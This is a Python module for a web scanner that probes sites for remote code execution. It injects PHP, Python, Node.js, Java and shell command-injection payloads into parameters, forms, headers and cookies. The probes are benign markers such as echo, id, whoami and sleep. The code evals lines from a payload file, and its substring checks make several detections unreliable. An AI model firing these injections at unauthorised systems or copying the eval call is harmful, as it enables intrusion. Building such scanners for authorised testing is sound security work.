#!/usr/bin/env python3
"""
RCE (Remote Code Execution) Scanner Module
Author: SayerLinux
"""

import re
import requests
import os
import time
import base64
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse


class RCEScanner:
    """Remote Code Execution vulnerability scanner"""
    
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': config.get('user_agent')})
        
        # Load RCE payloads
        self.payloads = self._load_payloads()
        
        # Setup timeout and retries
        self.timeout = config.get('timeout', 30)
        self.retries = config.get('retries', 3)
    
    def _load_payloads(self) -> List[Dict[str, Any]]:
        """Load RCE payloads from file or use defaults"""
        payload_file = self.config.get('payloads.rce_payloads_file')
        
        if payload_file and os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                return [eval(line.strip()) for line in f if line.strip()]
        
        # Default RCE payloads with detection patterns
        return [
            # PHP RCE
            {'payload': '<?php echo "MOUS_RCE_TEST"; ?>', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': '<?php system("echo MOUS_RCE_TEST"); ?>', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': '<?php exec("echo MOUS_RCE_TEST"); ?>', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': '<?php shell_exec("echo MOUS_RCE_TEST"); ?>', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': '<?php passthru("echo MOUS_RCE_TEST"); ?>', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': '<?php system("id"); ?>', 'pattern': r'uid=\d+\('},
            {'payload': '<?php system("whoami"); ?>', 'pattern': '(root|www-data|apache|nobody|daemon)'},
            {'payload': '<?php phpinfo(); ?>', 'pattern': 'phpinfo\\(\\)'},
            
            # Command injection
            {'payload': 'test; echo MOUS_RCE_TEST', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'test && echo MOUS_RCE_TEST', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'test || echo MOUS_RCE_TEST', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'test | echo MOUS_RCE_TEST', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'test`echo MOUS_RCE_TEST`', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'test$(echo MOUS_RCE_TEST)', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'test`id`', 'pattern': r'uid=\d+\('},
            {'payload': 'test$(id)', 'pattern': r'uid=\d+\('},
            {'payload': 'test`whoami`', 'pattern': '(root|www-data|apache|nobody|daemon)'},
            {'payload': 'test$(whoami)', 'pattern': '(root|www-data|apache|nobody|daemon)'},
            
            # Python RCE
            {'payload': '__import__("os").system("echo MOUS_RCE_TEST")', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'eval("__import__(\"os\").system(\"echo MOUS_RCE_TEST\")")', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'exec("__import__(\"os\").system(\"echo MOUS_RCE_TEST\")")', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': '__import__("os").system("id")', 'pattern': r'uid=\d+\\('},
            {'payload': '__import__("os").system("whoami")', 'pattern': '(root|www-data|apache|nobody|daemon)'},
            
            # Node.js RCE
            {'payload': 'require("child_process").exec("echo MOUS_RCE_TEST")', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'process.mainModule.require("child_process").exec("echo MOUS_RCE_TEST")', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'global.process.mainModule.require("child_process").exec("echo MOUS_RCE_TEST")', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'require("child_process").exec("id")', 'pattern': r'uid=\d+\\('},
            {'payload': 'require("child_process").exec("whoami")', 'pattern': '(root|www-data|apache|nobody|daemon)'},
            
            # Java RCE
            {'payload': '${Runtime.getRuntime().exec("echo MOUS_RCE_TEST")}', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': '${T(java.lang.Runtime).getRuntime().exec("echo MOUS_RCE_TEST")}', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': '${Runtime.getRuntime().exec("id")}', 'pattern': r'uid=\d+\\('},
            {'payload': '${Runtime.getRuntime().exec("whoami")}', 'pattern': '(root|www-data|apache|nobody|daemon)'},
            
            # DNS-based detection
            {'payload': 'nslookup MOUS_RCE_TEST.example.com', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'dig MOUS_RCE_TEST.example.com', 'pattern': 'MOUS_RCE_TEST'},
            {'payload': 'ping -c 1 MOUS_RCE_TEST.example.com', 'pattern': 'MOUS_RCE_TEST'},
            
            # Time-based detection
            {'payload': 'sleep 5', 'pattern': None},
            {'payload': 'ping -c 5 127.0.0.1', 'pattern': None},
            {'payload': 'timeout 5', 'pattern': None},
        ]
    
    def scan(self, target: str) -> List[Dict[str, Any]]:
        """Scan target for RCE vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Get initial response to find forms and parameters
            response = self.session.get(target, timeout=self.timeout)
            
            # Scan URL parameters
            url_vulns = self._scan_url_parameters(target)
            vulnerabilities.extend(url_vulns)
            
            # Scan forms
            form_vulns = self._scan_forms(target, response.text)
            vulnerabilities.extend(form_vulns)
            
            # Scan HTTP headers
            header_vulns = self._scan_headers(target)
            vulnerabilities.extend(header_vulns)
            
            # Scan cookies
            cookie_vulns = self._scan_cookies(target)
            vulnerabilities.extend(cookie_vulns)
            
            # Scan for specific RCE patterns in responses
            pattern_vulns = self._scan_response_patterns(target)
            vulnerabilities.extend(pattern_vulns)
            
        except Exception as e:
            print(f"Error in RCE scan: {str(e)}")
        
        return vulnerabilities
    
    def _scan_url_parameters(self, url: str) -> List[Dict[str, Any]]:
        """Scan URL parameters for RCE"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            for payload_data in self.payloads:
                try:
                    payload = payload_data['payload']
                    pattern = payload_data['pattern']
                    
                    # Create test URL with payload
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    
                    new_query = urlencode(new_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout)
                    response_time = time.time() - start_time
                    
                    if self._detect_rce(response, payload, pattern, response_time):
                        vulnerabilities.append({
                            'type': 'RCE',
                            'subtype': 'Remote Code Execution',
                            'severity': 'critical',
                            'description': f'RCE vulnerability in URL parameter: {param_name}',
                            'parameter': param_name,
                            'payload': payload,
                            'url': test_url,
                            'evidence': response.text[:300] + '...' if len(response.text) > 300 else response.text
                        })
                    
                    time.sleep(self.config.get('delay', 0))
                    
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _scan_forms(self, url: str, html_content: str) -> List[Dict[str, Any]]:
        """Scan forms for RCE vulnerabilities"""
        vulnerabilities = []
        
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                inputs = form.find_all(['input', 'textarea', 'select'])
                
                form_url = urljoin(url, form_action)
                
                for input_tag in inputs:
                    input_name = input_tag.get('name')
                    if not input_name:
                        continue
                    
                    input_type = input_tag.get('type', 'text')
                    if input_type.lower() in ['submit', 'button', 'hidden']:
                        continue
                    
                    for payload_data in self.payloads:
                        try:
                            payload = payload_data['payload']
                            pattern = payload_data['pattern']
                            
                            form_data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                if name:
                                    if name == input_name:
                                        form_data[name] = payload
                                    else:
                                        form_data[name] = inp.get('value', 'test')
                            
                            start_time = time.time()
                            if form_method == 'post':
                                response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                            
                            response_time = time.time() - start_time
                            
                            if self._detect_rce(response, payload, pattern, response_time):
                                vulnerabilities.append({
                                    'type': 'RCE',
                                    'subtype': 'Remote Code Execution',
                                    'severity': 'critical',
                                    'description': f'RCE vulnerability in form input: {input_name}',
                                    'form_action': form_action,
                                    'form_method': form_method,
                                    'input_name': input_name,
                                    'payload': payload,
                                    'url': form_url,
                                    'evidence': response.text[:300] + '...' if len(response.text) > 300 else response.text
                                })
                            
                            time.sleep(self.config.get('delay', 0))
                            
                        except Exception as e:
                            continue
        
        except Exception as e:
            print(f"Error scanning forms: {str(e)}")
        
        return vulnerabilities
    
    def _scan_headers(self, url: str) -> List[Dict[str, Any]]:
        """Scan HTTP headers for RCE vulnerabilities"""
        vulnerabilities = []
        
        # Common headers that might be vulnerable to RCE
        vulnerable_headers = [
            'User-Agent',
            'X-Forwarded-For',
            'X-Real-IP',
            'Referer',
            'X-Requested-With',
            'Accept-Language',
            'Accept-Encoding',
            'Cookie',
            'Authorization'
        ]
        
        for header_name in vulnerable_headers:
            for payload_data in self.payloads:
                try:
                    payload = payload_data['payload']
                    pattern = payload_data['pattern']
                    
                    headers = {header_name: payload}
                    
                    start_time = time.time()
                    response = self.session.get(url, headers=headers, timeout=self.timeout)
                    response_time = time.time() - start_time
                    
                    if self._detect_rce(response, payload, pattern, response_time):
                        vulnerabilities.append({
                            'type': 'RCE',
                            'subtype': 'Header-based RCE',
                            'severity': 'critical',
                            'description': f'RCE vulnerability in HTTP header: {header_name}',
                            'header_name': header_name,
                            'payload': payload,
                            'url': url,
                            'evidence': response.text[:300] + '...' if len(response.text) > 300 else response.text
                        })
                    
                    time.sleep(self.config.get('delay', 0))
                    
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _scan_cookies(self, url: str) -> List[Dict[str, Any]]:
        """Scan cookies for RCE vulnerabilities"""
        vulnerabilities = []
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Get cookies from response
            cookies = response.cookies
            
            for cookie_name in cookies.keys():
                for payload_data in self.payloads:
                    try:
                        payload = payload_data['payload']
                        pattern = payload_data['pattern']
                        
                        # Create new session with modified cookie
                        temp_session = requests.Session()
                        temp_session.headers.update({'User-Agent': self.config.get('user_agent')})
                        temp_session.cookies.set(cookie_name, payload)
                        
                        start_time = time.time()
                        response = temp_session.get(url, timeout=self.timeout)
                        response_time = time.time() - start_time
                        
                        if self._detect_rce(response, payload, pattern, response_time):
                            vulnerabilities.append({
                                'type': 'RCE',
                                'subtype': 'Cookie-based RCE',
                                'severity': 'critical',
                                'description': f'RCE vulnerability in cookie: {cookie_name}',
                                'cookie_name': cookie_name,
                                'payload': payload,
                                'url': url,
                                'evidence': response.text[:300] + '...' if len(response.text) > 300 else response.text
                            })
                        
                        time.sleep(self.config.get('delay', 0))
                        
                    except Exception as e:
                        continue
        
        except Exception as e:
            print(f"Error scanning cookies: {str(e)}")
        
        return vulnerabilities
    
    def _scan_response_patterns(self, url: str) -> List[Dict[str, Any]]:
        """Scan for specific RCE patterns in responses"""
        vulnerabilities = []
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Check for common RCE indicators in response
            rce_patterns = [
                (r'uid=\d+\([^)]*\)', 'Command execution detected'),
                (r'root:x:\d+:\d+:root:', 'System file access detected'),
                (r'C:\\Windows\\System32', 'Windows system path detected'),
                (r'/bin/bash|/bin/sh|/usr/bin/bash|/usr/bin/sh', 'Shell access detected'),
                (r'whoami|id|uname|ls|dir|pwd', 'Command execution detected'),
                (r'phpinfo\\(\\)', 'PHP info disclosure'),
                (r'<title>phpinfo\\(\\)</title>', 'PHP info page'),
                (r'Apache/[\d.]+', 'Server info disclosure'),
                (r'nginx/[\d.]+', 'Server info disclosure'),
                (r'python_version|sys\.version', 'Python info disclosure'),
                (r'node_version|process\.version', 'Node.js info disclosure')
            ]
            
            for pattern, description in rce_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerabilities.append({
                        'type': 'RCE',
                        'subtype': 'Response Pattern Detection',
                        'severity': 'high',
                        'description': description,
                        'pattern': pattern,
                        'url': url,
                        'evidence': response.text[:300] + '...' if len(response.text) > 300 else response.text
                    })
        
        except Exception as e:
            print(f"Error scanning response patterns: {str(e)}")
        
        return vulnerabilities
    
    def _detect_rce(self, response: requests.Response, payload: str, pattern: str, response_time: float) -> bool:
        """Detect if RCE payload was successful"""
        try:
            # Time-based detection for blind RCE
            if payload in ['sleep 5', 'ping -c 5 127.0.0.1', 'timeout 5']:
                if response_time >= 4.5:  # Allow some tolerance
                    return True
            
            # Pattern-based detection
            if pattern and pattern in response.text:
                return True
            
            # Check for command output patterns
            command_outputs = [
                'uid=',
                'gid=',
                'groups=',
                'whoami',
                'hostname',
                'uname -a',
                'ls -la',
                'dir',
                'echo MOUS_RCE_TEST'
            ]
            
            for output in command_outputs:
                if output in response.text:
                    return True
            
            return False
            
        except Exception as e:
            return False